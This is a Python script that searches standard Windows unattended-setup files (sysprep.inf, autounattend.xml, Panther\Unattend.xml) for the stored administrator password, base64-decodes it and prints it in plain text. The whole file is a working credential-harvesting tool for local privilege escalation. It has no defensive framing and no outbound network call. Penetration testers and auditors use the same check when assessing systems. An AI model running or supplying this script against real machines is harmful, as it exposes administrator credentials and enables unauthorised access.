import os
import re
import base64


# Function to extract administrative password from raw XML string
def extract_password_from_raw_xml(file_path):
    try:
        with open(file_path, 'r', encoding="utf-8") as file:
            raw_xml = file.read()
       
        print(f"DEBUG: XML Content from {file_path}:\n{raw_xml[:500]}")  # Print first 500 chars for debugging


        # Updated regex to correctly extract password
        match = re.search(r'<AdministratorPassword>\s*<Value>([^<]+)</Value>', raw_xml, re.DOTALL)


        if match:
            return match.group(1).strip()
        else:
            print("DEBUG: Password not found using regex.")
            return None
    except Exception as e:
        print(f"Error reading {file_path}: {e}")
        return None


# Function to decode Base64-encoded password
def decode_base64_password(encoded_password):
    try:
        missing_padding = len(encoded_password) % 4
        if missing_padding:
            encoded_password += '=' * (4 - missing_padding)


        decoded_bytes = base64.b64decode(encoded_password)
        return decoded_bytes.decode('utf-8', errors="ignore")
    except Exception as e:
        print(f"Error decoding password: {e}")
        return None


# Function to check multiple paths for unattended files
def check_multiple_paths_for_password(paths):
    for path in paths:
        if os.path.exists(path):
            print(f"Checking {path}...")
            password_base64 = extract_password_from_raw_xml(path)
            if password_base64:
                print(f"Base64-encoded password: {password_base64}")
                decoded_password = decode_base64_password(password_base64)
                if decoded_password:
                    print(f"Decoded password: {decoded_password}")
                    return decoded_password
                else:
                    print(f"Failed to decode password from {path}.")
            else:
                print(f"No password found in {path}.")
        else:
            print(f"Path does not exist: {path}")
    return None


# Main function
def main():
    possible_paths = [
        r"C:\Windows\System32\sysprep\sysprep.inf",
        r"C:\autounattend.xml",
        r"C:\Windows\Panther\Unattend.xml"
    ]


    print("Searching for administrative password in unattended files...")
    password = check_multiple_paths_for_password(possible_paths)


    if password:
        print(f"Final decoded password: {password}")
    else:
        print("No password found in any of the paths.")


if __name__ == "__main__":
    main()
